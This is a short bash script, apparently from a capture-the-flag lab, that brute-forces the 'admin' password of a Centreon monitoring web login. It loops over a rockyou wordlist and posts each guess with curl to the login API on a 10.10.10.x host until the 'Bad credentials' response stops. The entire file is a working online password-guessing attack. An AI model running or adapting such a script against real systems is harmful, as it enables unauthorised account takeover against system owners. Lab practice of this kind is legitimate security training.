#!/bin/bash
# brutes Centreon login pw
 
USER="admin"
# try each password
for i in $(cat /root/Desktop/lists/rockyou-30.txt); do
    printf "[-] Trying \"$i\"\n"
 
    # attempt password
    RESULT=$(curl -sX POST http://10.10.10.157/centreon/api/index.php?action=authenticate --data "username=$USER&amp;password=$i")
 
    # did it work?
    if [[ "$RESULT" != *"Bad credentials"* ]];
    then
        printf "[+] Success! Password is: $i\n"
        exit 1
    fi
done
